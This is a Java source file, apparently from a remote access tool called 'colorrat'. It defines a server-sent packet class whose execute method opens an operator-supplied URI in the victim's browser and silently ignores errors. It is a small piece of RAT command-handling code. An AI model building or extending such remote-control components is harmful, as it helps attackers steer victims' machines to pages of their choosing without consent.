package eu.aragonapp.colorrat.network.packet.types.server;

import eu.aragonapp.colorrat.network.NetworkConnection;
import eu.aragonapp.colorrat.network.packet.Packet;

import java.awt.*;
import java.net.URI;

/**
 * @Copyright (c) 2018 Mythic Inc. (http://www.mythic.com/) All Rights Reserved.
 * <p>
 * Mythic Inc. licenses this file to you under the Apache License,
 * @Version 2.0 (the "License"); you may not use this file except
 * in compliance with the License.
 * You may obtain a copy of the License at
 * @https://www.apache.org/licenses/LICENSE-2.0
 */
public class S02OpenBrowser extends Packet {

    private static final long serialVersionUID = 1L;

    private URI uri;

    @Override
    public void execute(NetworkConnection connection) {
        try {
            Desktop.getDesktop().browse(this.uri);
        } catch (Exception ex) { }
    }

}
